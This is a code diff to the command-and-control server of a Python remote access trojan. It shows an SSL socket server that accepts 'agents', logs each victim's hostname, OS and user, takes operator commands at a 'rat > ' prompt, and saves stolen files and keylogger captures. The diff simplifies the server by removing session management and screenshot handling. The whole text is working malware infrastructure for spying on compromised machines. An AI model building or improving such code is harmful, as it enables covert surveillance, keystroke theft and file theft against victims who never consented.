@@ -3,13 +3,10 @@
 # lancer threads
 import socket
 import ssl
-import json
-import datetime
-import time
 from threading import Thread
 from utils.logger import setup_logger
 from rat.server._build_upload_payload import _build_upload_payload
-from rat.server.sessions import SessionManager
+import json
 
 logger = setup_logger()
 
@@ -18,8 +15,6 @@ class SSLServer:
     def __init__(
         self, host, port, server_cert, server_key, client_cert, chunk_size=1024
     ):
-        self._running = True
-        self._server_socket = None
         self.host = host
         self.port = port
         self.chunk_size = chunk_size
@@ -27,257 +22,216 @@ class SSLServer:
         self._context.verify_mode = ssl.CERT_REQUIRED
         self._context.load_cert_chain(server_cert, server_key)
         self._context.load_verify_locations(client_cert)
-        self._sessions = SessionManager()
-
-    def shutdown(self):
-        logger.info("Shutdown requested")
-        self._running = False
-        if self._server_socket:
-            self._server_socket.close()
 
     def connect(self):
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
-        self._server_socket = sock
-        sock.bind((self.host, self.port))
-        sock.listen(5)
-        sock.settimeout(1)
 
-        print("Server listening")
-        logger.info("Server listening")
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
 
-        while self._running:
-            try:
+            sock.bind((self.host, self.port))
+
+            sock.listen(5)
+
+            print("Server listening")
+            logger.info("Server listening")
+            while True:
+
                 conn, addr = sock.accept()
-            except socket.timeout:
-                continue
 
-            try:
-                sconn = self._context.wrap_socket(conn, server_side=True)
-                print("Client connected:", addr[0])
-                logger.info("Client connected: %s", addr[0])
+                try:
 
-                data = self._recv_message(sconn)
-                client_info = json.loads(data)
+                    sconn = self._context.wrap_socket(
+                        conn,
+                        server_side=True,
+                    )
 
-                logger.info(
-                    "New agent: %s | %s | %s | %s",
-                    client_info["hostname"],
-                    client_info["os"],
-                    client_info["user"],
-                    client_info["release"],
-                )
+                    print("Client connected:", addr[0])
+                    logger.info("Client connected: %s", addr[0])
 
-                session = self._sessions.add_session(sconn, client_info)
-                Thread(target=self._handle_client, args=(session,), daemon=True).start()
+                    data = self._recv_until_eof(sconn)
 
-            except ssl.SSLError:
-                print("SSL handshake failed")
-                logger.error("SSL handshake failed")
+                    client_info = json.loads(data)
 
-        logger.info("Server stopped")
-        sock.close()
+                    logger.info(
+                        "New agent: %s | %s | %s | %s",
+                        client_info["hostname"],
+                        client_info["os"],
+                        client_info["user"],
+                        client_info["release"],
+                    )
 
-    # ------------- Low‑level I/O (length‑prefixed) -------------
-    def _send_message(self, sock, msg: str):
-        """Send a string as a length‑prefixed block."""
-        data = msg.encode()
-        size = str(len(data)).encode() + b"\n"
-        sock.sendall(size)
-        sock.sendall(data)
+                    Thread(
+                        target=self._handle_client,
+                        args=(sconn,),
+                        daemon=True,
+                    ).start()
 
-    def _recv_message(self, sock) -> str | None:
-        """Receive a length‑prefixed block and return the decoded string."""
-        size_data = b""
-        while not size_data.endswith(b"\n"):
-            chunk = sock.recv(1)
-            if not chunk:
-                return None
-            size_data += chunk
+                except ssl.SSLError:
+
+                    print("SSL handshake failed")
+                    logger.error("SSL handshake failed")
+
+    def _recv(self, sock):
 
         try:
-            size = int(size_data.strip())
-        except ValueError:
-            return None
 
-        buffer = b""
-        while len(buffer) < size:
-            chunk = sock.recv(min(self.chunk_size, size - len(buffer)))
-            if not chunk:
-                return None
-            buffer += chunk
+            while True:
 
-        return buffer.decode(errors="ignore")
+                data = sock.recv(self.chunk_size)
 
-    # ------------- Response handlers -------------
+                if not data:
+                    print("Client disconnected")
+                    logger.warning("Client disconnected")
+                    break
+
+                print(data.decode())
+
+        except ConnectionResetError:
+
+            print("Client forcibly closed connection")
+            logger.warning("Client forcibly closed connection")
+
+        except ssl.SSLError:
+
+            print("SSL error")
+            logger.error("SSL error")
+        except Exception as e:
+
+            print(f"Error: {e}")
+
+        finally:
+
+            sock.close()
+
     def _save_download(self, response):
+
         try:
+
             lines = response.split("\n")
+
             if lines[0] != "DOWNLOAD":
                 print(response)
                 return
+
             if lines[1] != "OK":
                 print("\n".join(lines[1:]))
                 return
+
             content = "\n".join(lines[2:])
-            filename = "downloaded_file_" + datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+
+            filename = "downloaded_file"
+
             with open(filename, "w") as f:
                 f.write(content)
+
             print(f"File saved: {filename}")
+
         except Exception as e:
+
             print("Download save error:", e)
 
     def _save_keylog(self, response):
+
         try:
+
             lines = response.split("\n")
+
             if lines[1] != "OK":
                 print(response)
                 return
+
             content = "\n".join(lines[2:])
+
             if not content:
                 print("No keystrokes captured")
                 return
-            filename = "keylogger_file_" + datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
+
+            filename = "keylogger_file"
+
             with open(filename, "w") as f:
                 f.write(content)
+
             print(f"Keylogger saved: {filename}")
+
         except Exception as e:
+
             print("Keylogger save error:", e)
 
-    def _save_screenshot(self, response):
-        import base64
+    def _recv_until_eof(self, sock):
+
+        buffer = ""
+
+        while True:
+
+            chunk = sock.recv(self.chunk_size)
+
+            if not chunk:
+                break
+
+            buffer += chunk.decode(errors="ignore")
+
+            if "\nEOF" in buffer:
+                break
+
+        return buffer.replace("\nEOF", "").strip()
+
+    def _handle_client(self, sock):
+
+        logger.info("Client handler started")
+
         try:
-            lines = response.split("\n")
-            if lines[1] != "OK":
-                print(response)
-                return
-            encoded = "".join(lines[2:])
-            image_bytes = base64.b64decode(encoded)
-            filename = f"screenshot_{datetime.datetime.now().timestamp()}.png"
-            with open(filename, "wb") as f:
-                f.write(image_bytes)
-            print(f"Screenshot saved: {filename}")
-        except Exception as e:
-            print("Screenshot save error:", e)
 
-    def _handle_response(self, response):
-        lines = response.split("\n")
-        response_type = lines[0]
+            while True:
 
-        if response_type == "DOWNLOAD":
-            self._save_download(response)
-        elif response_type == "KEYLOG":
-            self._save_keylog(response)
-        elif response_type == "SCREENSHOT":
-            self._save_screenshot(response)
-        elif response_type == "UPLOAD":
-            # Just print the upload status
-            print("\n".join(lines))
-        else:
-            print(response)
+                command = input("rat > ")
 
-        # Logging
-        if response_type in ("SCREENSHOT", "DOWNLOAD", "KEYLOG", "UPLOAD"):
-            logger.info("Client responded with %s", response_type)
-        else:
-            logger.info("Client responded: %s", response)
+                if not command:
+                    continue
 
-    # ------------- Session management -------------
-    def _print_sessions(self):
-        sessions = self._sessions.list_sessions()
-        if not sessions:
-            print("No active sessions")
-            return
-        print("\nID   Hostname        OS        User")
-        for s in sessions:
-            print(f"{s.id:<4}" f"{s.hostname:<15}" f"{s.os:<10}" f"{s.user}")
+                if command.startswith("upload "):
+                    payload = _build_upload_payload(command)
+                    if payload.startswith("ERROR"):
+                        print(payload)
+                        continue
+                    sock.sendall(payload.encode())
+                else:
+                    sock.sendall((command + "\nEOF").encode())
 
-    def _handle_use(self, command):
-        try:
-            parts = command.split()
-            if len(parts) != 2:
-                print("Usage: use <session_id>")
-                return
-            session_id = int(parts[1])
-        except ValueError:
-            print("Invalid session id")
-            return
-        if self._sessions.set_active(session_id):
-            print(f"Switched to session {session_id}")
-            logger.info("Active session set to %s", session_id)
-        else:
-            print("Session not found")
+                logger.info("Server sent command: %s", command)
 
-    # ------------- Sending commands (incorporates upload) -------------
-    def _send_to_active_session(self, command):
-        session = self._sessions.get_active()
-        if not session:
-            print("No active session. Use 'sessions' then 'use <id>'")
-            return
+                response = self._recv_until_eof(sock)
 
-        sock = session.sock
-        try:
-            # If it's an upload command, build the payload and send exactly that
-            if command.startswith("upload "):
-                payload = _build_upload_payload(command)
-                if payload.startswith("ERROR"):
-                    print(payload)
-                    return
-                self._send_message(sock, payload)
-            else:
-                self._send_message(sock, command)
+                if not response:
+                    logger.warning("Client disconnected")
 
-            logger.info("Command sent to session %s: %s", session.id, command)
-
-            response = self._recv_message(sock)
-            if not response:
-                print("Client disconnected")
-                self._sessions.remove_session(session.id)
-                return
-
-            self._handle_response(response)
-
-        except Exception as e:
-            print("Send error:", e)
-
-    # ------------- Client monitor thread (kept minimal) -------------
-    def _handle_client(self, session):
-        logger.info("Session %s handler started", session.id)
-        try:
-            while self._running:
-                if session.sock.fileno() == -1:
                     break
-                time.sleep(1)   # just keep the thread alive until disconnect
+
+                lines = response.split("\n")
+
+                response_type = lines[0]
+
+                if response_type == "DOWNLOAD":
+
+                    self._save_download(response)
+
+                elif response_type == "KEYLOG":
+
+                    self._save_keylog(response)
+
+                else:
+
+                    print(response)
+
+                logger.info("Client responded: %s", response)
+
+        except Exception as e:
+
+            logger.error("Client handler error: %s", e)
+
         finally:
-            logger.info("Session %s disconnected", session.id)
-            self._sessions.remove_session(session.id)
-            try:
-                session.sock.close()
-            except Exception:
-                pass
 
-    # ------------- Main interactive console -------------
-    def run_console(self):
-        while self._running:
-            try:
-                command = input("rat > ").strip()
-            except EOFError:
-                print()
-                self.shutdown()
-                break
+            logger.info("Closing client socket")
 
-            if not command:
-                continue
-            if command == "exit":
-                self.shutdown()
-                break
-            if command == "sessions":
-                self._print_sessions()
-                continue
-            if command.startswith("use "):
-                self._handle_use(command)
-                continue
-
-            self._send_to_active_session(command)
+            sock.close()
 
 
 class SSLServerThread(Thread):
